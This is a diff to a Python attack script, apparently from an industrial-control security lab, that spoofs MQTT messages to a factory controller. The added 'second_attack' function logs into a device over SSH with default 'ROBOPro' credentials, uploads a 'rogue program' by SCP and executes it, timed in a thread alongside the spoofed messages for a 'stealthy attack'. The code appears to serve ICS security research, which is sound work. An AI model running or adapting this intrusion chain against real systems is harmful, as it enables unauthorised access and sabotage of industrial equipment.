@@ -9,6 +9,10 @@ import scapy.all as scapy
 import sqlite3
 import paho.mqtt.client as mqtt
 
+from paramiko import SSHClient
+from paramiko.client import AutoAddPolicy
+from scp import SCPClient
+
 "Starting"
 # First we definee variables
 src_ip = "192.168.0.105"
@@ -16,6 +20,36 @@ dst_ip = "192.168.0.10"
 dst_port = 1883
 
 log_sub = 0
+
+
+def second_attack():
+    print("Starting file upload attack on 192.168.0.13")
+    server = '192.168.0.13'
+    port = '22'
+    username = password = 'ROBOPro'
+
+    # create ssh object and connect
+    ssh = SSHClient()
+    ssh.load_host_keys('/home/kali/.ssh/known_hosts')
+    ssh.set_missing_host_key_policy(AutoAddPolicy)
+    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+
+    # hijack the established tcp/ssh connection and copy files
+    scp = SCPClient(ssh.get_transport())
+    path = '/home/kali/fischer/vgr/C-Program/'
+    # now copy the rogue program
+    scp.put(f'{path}TxtParkPosVGR', '.')
+
+    # now run the rogue program
+    ssh.exec_command('./TxtParkPosVGR')
+    time.sleep(7)
+    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+    ssh.exec_command('./TxtParkPosVGR')
+    print("Finished file upload attack on 192.168.0.13")
+
+
+thread = threading.Thread(target=second_attack)
+
 
 def state(active, code, description="", station="vgr", target=None):
     if target is None:
@@ -139,6 +173,7 @@ def on_publish(client, userdata, msgid, *rest):
             data = '{\n\t"code" : 3,\n\t' + new_ts()[:-2] + \
                    ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
             client.publish("fl/vgr/do", data, qos=1)
+            thread.start()
 
         # case block to handle bulk cases where active, code, target is 0,1,hbw respectively
         case 35 | 38 | 40 | 41 | 42 | 44 | 46 | 48:
@@ -215,6 +250,9 @@ def on_publish(client, userdata, msgid, *rest):
                 time.sleep(0.6)
             data = state(0, 1, "", "vgr", "dso")
             client.publish("f/i/state/vgr", data, qos=1)
+            if msgid == 107:
+                # then we wait to be sure the SSH attack is done
+                thread.join()
 
         # case block to handle bulk cases where active, code, target is 1,2,dso respectively
         case 77 | 79 | 83 | 85 | 91 | 93 | 96 | 105:
@@ -263,7 +301,7 @@ def on_message(client, userdata, mqttmsg):
     #UPdate: the below client.ack doesn't kick in because I have not set manual_ack=True in client.connect
     client.ack(mid=mqttmsg.mid, qos=1)  #-- plan here is to take the mid and qos from the received message and place here
 
-    if mqttmsg.mid == 1 or mqttmsg.topic == "f/o/order":
+    if mqttmsg.topic == "f/o/order":
         print("HAVE A LOOK HERE. You left this open to handle the case of when the broker publishes an order"
               "to 192.168.0.13 via f/o/order, so you can then begin your stealthy attack with f/i/order at id 34")
 
